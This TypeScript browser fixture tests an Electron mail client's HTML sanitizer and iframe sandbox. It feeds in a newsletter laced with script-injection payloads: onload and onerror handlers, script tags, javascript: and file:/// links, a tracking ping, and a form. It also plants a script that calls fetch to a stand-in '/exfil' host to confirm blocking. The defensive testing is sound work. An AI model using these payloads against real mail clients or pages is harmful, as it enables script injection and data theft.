// Browser fixture bundled only by apple-mail-html-electron.test.ts.
import { createRoot } from 'react-dom/client';
import { flushSync } from 'react-dom';
import { MailBrowser } from '../frontend/src/features/mail/MailView';
import { mailHtmlDocument, mailLink } from '../frontend/src/features/mail/mailHtmlDocument';
import { mailApiFixture, mailMessageFixture, mailSuccess } from './apple-mail-fixtures';

const image = { contentId: 'logo@test', mimeType: 'image/png', base64: 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+a2ioAAAAASUVORK5CYII=' };
const html = `<html><head><style>@import url(https://mail-fixture.invalid/stylesheet.css);
  @font-face{font-family:remote;src:url(https://mail-fixture.invalid/font.woff2)}
  h1{font-size:37px;color:rgb(30,40,90);font-family:remote}body{background:#eef}
  .hero{background:url(https://mail-fixture.invalid/background.png)}</style>
  <base href="https://mail-fixture.invalid/"><meta http-equiv="refresh" content="0;url=https://mail-fixture.invalid/redirect"></head>
  <body onload="parent.compromised=true"><div style="display:none">Preheader</div>
  <table width="100%"><tr><td style="padding:8px"><table id="layout" width="600" style="max-width:600px" cellpadding="16"><tr><td><h1>Newsletter</h1>
  <img id="logo" width="160" src="cid:logo%40test" onerror="parent.compromised=true"><p style="margin:24px">Hello</p>
  <a href="https://example.test/docs" target="_top" ping="https://mail-fixture.invalid/track">Docs</a>
  <a href="javascript:alert(1)">Unsafe</a><img src="cid:missing"><img src="file:///secret">
  <img src="https://mail-fixture.invalid/image.png"><div class="hero">Background</div>
  <div style="background:url(cid:logo%40test)">Inline background</div>
  <script>parent.compromised=true</script><iframe src="https://mail-fixture.invalid/frame"></iframe>
  <form action="https://mail-fixture.invalid/form"><input name="secret"></form><svg onload="alert(1)"></svg>
  </td></tr><tr><td><table id="columns" width="240"><tr><td width="80">A</td><td>B</td></tr></table></td></tr>
  </table></td></tr></table></body></html>`;
const message = { ...mailMessageFixture, html, inlineImages: [image] };
const api = mailApiFixture({
  list: async () => mailSuccess({ offset: 0, nextOffset: null, messages: [message, { ...message, id: 2 }] }),
  read: async target => mailSuccess({ ...message, id: target.id }),
});
const root = createRoot(document.getElementById('root')!);
const pause = () => new Promise(resolve => setTimeout(resolve, 150));
const frame = () => document.querySelector('iframe')!;
const button = () => [...document.querySelectorAll<HTMLButtonElement>('#root button')].find(button => button.textContent === 'Load images');
async function waitFor(check: () => boolean) {
  for (let i = 0; i < 200; i++) {
    if (check()) return;
    await new Promise(resolve => setTimeout(resolve, 10));
  }
  throw new Error('Mail fixture did not settle');
}
async function selectMessage(index: number) {
  const row = document.querySelectorAll<HTMLButtonElement>('[aria-label="Message list"] button[aria-pressed]')[index]!;
  flushSync(() => row.click());
  await waitFor(() => frame()?.contentDocument?.querySelector('h1')?.textContent === 'Newsletter' && frame().contentDocument?.readyState === 'complete');
  await pause();
}
function widths() {
  const current = frame();
  const doc = current.contentDocument!;
  const layout = doc.getElementById('layout')!;
  const parent = layout.parentElement!;
  const style = current.contentWindow!.getComputedStyle(parent);
  return { article: current.closest('article')!.clientWidth, frame: current.getBoundingClientRect().width,
    layout: layout.getBoundingClientRect().width,
    available: parent.clientWidth - parseFloat(style.paddingLeft) - parseFloat(style.paddingRight),
    columns: doc.getElementById('columns')!.getBoundingClientRect().width,
    logo: doc.getElementById('logo')!.getBoundingClientRect().width,
    overflow: doc.documentElement.scrollWidth > current.clientWidth };
}

async function prepare() {
  const clean = mailHtmlDocument(html, [image], false, window);
  const doc = new DOMParser().parseFromString(clean.srcDoc, 'text/html');
  const formatting = {
    title: doc.querySelector('h1')?.textContent,
    padding: doc.querySelector('#layout')?.getAttribute('cellpadding'),
    margin: doc.querySelector('p')?.getAttribute('style'),
    active: doc.querySelectorAll('script,iframe,form,input,svg,base,[onload],[onerror],[ping],[target]').length,
    links: doc.querySelectorAll('a[href]').length,
    refresh: doc.querySelector('meta[http-equiv="refresh"]') !== null,
    cid: doc.querySelector('#logo')?.getAttribute('src') === `data:image/png;base64,${image.base64}`,
    unsafeLinks: ['javascript:alert(1)', 'file:///secret', 'data:text/html,test', 'cheshi://open', 'https://user:pass@example.test'].map(mailLink),
    remote: clean.hasRemoteImages,
  };
  flushSync(() => root.render(<MailBrowser api={api} rightSidebarOpen={false} onToggleRightSidebar={() => {}} />));
  await waitFor(() => document.querySelectorAll('[aria-label="Message list"] button[aria-pressed]').length === 2);
  await selectMessage(0);
  const live = frame().contentDocument!;
  const display = {
    title: live.querySelector('h1')?.textContent,
    font: frame().contentWindow!.getComputedStyle(live.querySelector('h1')!).fontSize,
    background: frame().contentWindow!.getComputedStyle(live.body).backgroundColor,
    loadedImage: (live.querySelector('#logo') as HTMLImageElement).naturalWidth,
    sandbox: frame().getAttribute('sandbox'),
    button: button()?.textContent,
    hostFont: getComputedStyle(document.getElementById('host-title')!).fontSize,
  };
  // Exercise CSP/sandbox even if a future sanitizer accidentally leaves active markup.
  frame().srcdoc = clean.srcDoc.replace('</body>', `<script>parent.compromised=true;fetch('https://mail-fixture.invalid/exfil')</script>
    <img src="https://mail-fixture.invalid/blocked" onerror="parent.compromised=true"></body>`);
  await pause();
  return { formatting, display, compromised: Object.hasOwn(window, 'compromised') };
}

async function allowImages() {
  flushSync(() => button()!.click());
  await waitFor(() => (frame()?.contentDocument?.querySelector('img[src^="https:"]') as HTMLImageElement | null)?.naturalWidth === 1);
  await pause();
  const doc = frame().contentDocument!;
  const href = doc.querySelector('a[href]')!;
  // Parent listener routes validated links to the normal external browser handler.
  href.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }));
  const remote = doc.querySelector('img[src^="https:"]') as HTMLImageElement;
  return { button: button()?.textContent ?? null, source: remote.getAttribute('src'), naturalWidth: remote.naturalWidth, widths: widths() };
}

async function switchMessage() {
  await selectMessage(1);
  const result = { button: button()?.textContent, remoteSources: frame().contentDocument!.querySelectorAll('img[src^="https:"]').length };
  return result;
}

async function reselectMessage() {
  await selectMessage(0);
  await waitFor(() => (frame()?.contentDocument?.querySelector('img[src^="https:"]') as HTMLImageElement | null)?.naturalWidth === 1);
  const first = { button: button()?.textContent ?? null, naturalWidth: (frame().contentDocument!.querySelector('img[src^="https:"]') as HTMLImageElement).naturalWidth };
  await selectMessage(0);
  const repeated = { button: button()?.textContent ?? null, remoteSources: frame().contentDocument!.querySelectorAll('img[src^="https:"]').length };
  document.getElementById('root')!.style.width = '700px';
  await pause();
  const narrow = widths();
  flushSync(() => root.unmount());
  return { first, repeated, narrow };
}

Object.assign(window, { mailChecks: { prepare, allowImages, switchMessage, reselectMessage } });
